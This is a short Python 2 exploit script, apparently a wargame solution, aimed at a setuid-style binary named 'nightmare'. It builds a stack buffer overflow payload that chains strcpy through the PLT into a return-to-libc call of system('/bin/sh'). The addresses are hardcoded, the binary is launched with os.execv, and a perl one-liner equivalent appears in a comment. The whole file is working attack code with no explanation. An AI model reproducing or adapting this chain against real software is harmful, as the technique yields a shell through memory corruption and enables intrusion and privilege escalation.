import os

victim = "/home/succubus/nightmare"
NOP = "\x90"*44
strcpy_plt = "\x10\x84\x04\x08"
buf_48 = "\xb0\xfa\xff\xbf"
argv_2 = "\x49\xfc\xff\xbf"

system = "\xe0\x8a\x05\x40"
exit = "\xe0\x91\x03\x40"
binsh = "\xf9\xbf\x0f\x40"

payload = NOP + strcpy_plt + "aaaa" + buf_48 + argv_2
argv2 = system + exit + binsh

print "[+] Victim : " + victim
print "[+] Loading payload..."
print "[+] Shellcode length : ", len(payload)
print

os.execv(victim, ("", payload, argv2))
#$(perl -e 'print "\x90"x44, "\x10\x84\x04\x08", "aaaa", "\xb0\xfa\xff\xbf", "\x49\xfc\xff\xbf"') $(perl -e 'print "\xe0\x8a\x05\x40", "\xe0\x91\x03\x40", "\xf9\xbf\x0f\x40"')